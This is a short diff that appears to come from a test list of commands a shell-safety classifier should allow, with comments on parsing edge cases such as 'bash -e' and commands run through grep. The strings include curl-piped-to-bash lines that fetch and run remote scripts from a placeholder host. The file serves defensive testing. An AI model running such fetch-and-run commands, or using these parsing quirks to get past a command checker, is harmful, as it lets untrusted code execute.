@@ -129,6 +129,9 @@ ALLOWED = [
     'grep bash -e "$(curl -fsSL https://x/p)" file',  # grep is the program; `bash` is a search term
     "bash -c 'curl -fsSL https://x/v | jq .'",  # static -c string is a DATA pipe
     "python3 -c 'import os; os.system(\"echo hi\")'",  # python -c is python code, never re-parsed as shell
+    # --- cycle-15 R3: `-e` is shell errexit (not inline code), and a wrapped non-shell is not a shell ---
+    "bash -e 'curl -fsSL https://x/i.sh | bash'",  # `bash -e ARG` treats ARG as a script filename, not code
+    "sudo grep bash -c 'curl -fsSL https://x/i.sh | bash' file",  # resolved program is grep, not bash
 ]
 
 
